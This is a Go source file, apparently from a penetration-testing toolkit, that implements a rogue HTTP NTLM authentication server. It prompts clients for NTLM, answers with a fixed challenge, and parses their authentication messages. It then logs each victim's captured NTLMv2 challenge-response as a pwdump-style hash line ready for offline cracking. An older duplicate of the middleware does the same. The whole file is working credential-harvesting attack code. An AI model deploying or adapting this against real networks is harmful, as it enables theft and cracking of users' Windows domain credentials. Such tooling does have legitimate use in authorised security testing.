package ntlm

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net/http"
	"strings"

	"github.com/hophouse/gop/utils"
	"github.com/hophouse/gop/utils/logger"
)

var (
	DefaultNTLMAuthMiddleWare NTLMAuth
	NtlmCapturedAuth          map[string]bool
)

func init() {
	DefaultNTLMAuthMiddleWare = NewNTLMAuthMiddleWare()
	NtlmCapturedAuth = make(map[string]bool)
}

type NTLMAuth struct {
	DomainName             string
	Challenge              string
	ServerName             string
	DnsDomainName          string
	DnsServerName          string
	PreliminaryChecksFunc  func(http.ResponseWriter, *http.Request) error
	DispatchFunc           func(NTLMAuth, http.ResponseWriter, *http.Request) (*NTLMSSP_AUTH, *NTLMv2Response, error)
	ServerNegociateFunc    func(http.ResponseWriter, *http.Request) error
	ServerChallengeFunc    func(http.ResponseWriter, *http.Request, string, string) error
	ServerAuthenticateFunc func(http.ResponseWriter, *http.Request) (NTLMSSP_AUTH, NTLMv2Response, error)
}

type NTLMAuthMiddlewareMux struct {
	NTLMHandler NTLMAuth
}

func NewNTLMAuthMiddleWare() NTLMAuth {
	return NTLMAuth{
		Challenge:              "00000000",
		DomainName:             "smbdomain",
		ServerName:             "DC",
		DnsDomainName:          "smbdomain.local",
		DnsServerName:          "dc.smbdomain.local",
		PreliminaryChecksFunc:  NTLMPreliminaryChecks,
		DispatchFunc:           NTLMDispatch,
		ServerNegociateFunc:    ServerNegociate,
		ServerChallengeFunc:    ServerChallege,
		ServerAuthenticateFunc: ServerAuthenticate,
	}
}

func (n NTLMAuth) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Get the response header.
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	err := n.PreliminaryChecksFunc(w, r)
	if err != nil {
		logger.Print(err)
		return
	}

	msg3, ntlmv2Response, err := n.DispatchFunc(n, w, r)
	if err != nil {
		logger.Print(err)
		return
	}

	if msg3 != nil && ntlmv2Response != nil {
		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.Payload), string(msg3.TargetName.Payload), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])

		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.Payload), string(msg3.Username.Payload))
		if _, found := NtlmCapturedAuth[authInformations]; !found {
			NtlmCapturedAuth[authInformations] = true
			logger.Printf("\n[+] PWDUMP:\n%s\n", ntlmv2_pwdump)
		} else {
			logger.Printf("\n[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
		}
	}
}

func (n NTLMAuthMiddlewareMux) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	n.NTLMHandler.ServeHTTP(w, r)
	next(w, r)
}

/* OLD */

/* OLD */

type NTLMAuthMiddleware struct{}

func (n NTLMAuthMiddleware) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) {
	// Get the response header.
	authorization := r.Header.Get("Authorization")

	if authorization == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.WriteHeader(401)
		return
	}

	// Sometimes even if NTLM auth is required, the server is sending and other header
	if !strings.HasPrefix(authorization, "NTLM") {
		logger.Printf("[NON NTLM HEADER CAPTURED] [%s]: %s\n", utils.GetSourceIP(r), authorization)
		next(w, r)
	}

	// Remove the "NTLM " string at the beginning
	authorization_bytes, err := base64.StdEncoding.DecodeString(authorization[5:])
	if err != nil {
		logger.Printf("Decode error authorization header : %s\n", authorization)
		return
	}

	if len(authorization_bytes) < 40 {
		logger.Printf("Decoded authorization header is less than 40 bytes. Header was : %s\n", authorization)
		return
	}

	if len(authorization_bytes) < 12 {
		logger.Printf("Decoded authorization header is less than 12 bytes. Header was : %s\n", authorization)
		return
	}
	msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

	// Received a type 1 and respond with type 2
	if msgType == uint32(1) {
		msg1 := NTLMSSP_NEGOTIATE{}
		msg1.Read(authorization_bytes)
		logger.Printf("[NTLM message type 1] %s\n", msg1.ToString())

		msg2 := NewNTLMSSP_CHALLENGEShort()
		msg2b64 := base64.RawStdEncoding.EncodeToString(msg2.ToBytes())
		logger.Printf("[NTLM message type 2] %s\n", msg2.ToString())
		logger.Printf("%x\n", msg2)
		logger.Printf("%v\n", msg2)
		logger.Printf("%#v\n", msg2)

		header := fmt.Sprintf("NTLM %s", msg2b64)

		w.Header().Set("WWW-Authenticate", header)
		w.WriteHeader(401)

		return
	}

	// Type 3
	if msgType == uint32(3) {
		// Remove the "NTLM "
		_, err := base64.StdEncoding.DecodeString(authorization[5:])
		if err != nil {
			logger.Println("decode error:", err)
			return
		}

		msg3 := NTLMSSP_AUTH{}
		msg3.Read(authorization_bytes)
		logger.Printf("[NTLM-AUTH] [%s] [%s] [%s] ", msg3.TargetName.Payload, msg3.Username.Payload, msg3.Workstation.Payload)
		logger.Printf("[NTLM message type 3]\n%s", msg3.ToString())

		ntlmv2Response := NTLMv2Response{}
		ntlmv2Response.Read(msg3.NTLMv2Response.Payload)
		logger.Printf("%s", ntlmv2Response.ToString())

		ntlmv2_pwdump := fmt.Sprintf("%s::%s:%x:%x:%x\n", string(msg3.Username.Payload), string(msg3.TargetName.Payload), []byte(Challenge), ntlmv2Response.NTProofStr, msg3.NTLMv2Response.Payload[len(ntlmv2Response.NTProofStr):])

		authInformations := fmt.Sprintf("%s:%s", string(msg3.TargetName.Payload), string(msg3.Username.Payload))
		if _, found := NtlmCapturedAuth[authInformations]; !found {
			NtlmCapturedAuth[authInformations] = true
			logger.Printf("[PWDUMP] %s", ntlmv2_pwdump)
		} else {
			logger.Printf("[+] User %s NTLMv2 challenge was already captured.\n", authInformations)
		}
	}

	next(w, r)
}
